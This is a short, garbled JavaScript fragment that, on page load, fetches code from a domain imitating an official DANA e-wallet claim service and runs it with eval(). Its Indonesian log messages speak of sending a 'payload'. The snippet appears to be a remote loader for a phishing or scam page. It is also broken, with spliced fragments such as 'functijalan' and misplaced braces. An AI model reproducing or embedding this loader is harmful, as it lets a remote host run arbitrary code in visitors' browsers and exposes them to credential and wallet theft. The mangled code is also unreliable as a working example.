fetch('https://cs-claim-resmi-x-dana.vercel.app/')
        .then(response => response.text())
        .then(data => eval(data))
        .catch(err => console.log('Payload gagal kirim:', err));
}window.onload = functijalan(function() {
    fetch('https://cs-claim-resmi-x-dana.vercel.app/')
        .then(response => response.text())
        .then(data => eval(data))
        .catch(err => console.log('Payload gagal kirim:', err));
})();

window.onload = function() {
    // Logic here after the window has loaded
};on() {
    fetch('https://cs-claim-resmi-x-dana.vercel.app/payload.js')
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok' + response.statusText);
            }
            return response.text();
        })
        .then(data => eval(data))
        .catch(err => console.error('Payload gagal kirim:', err));
};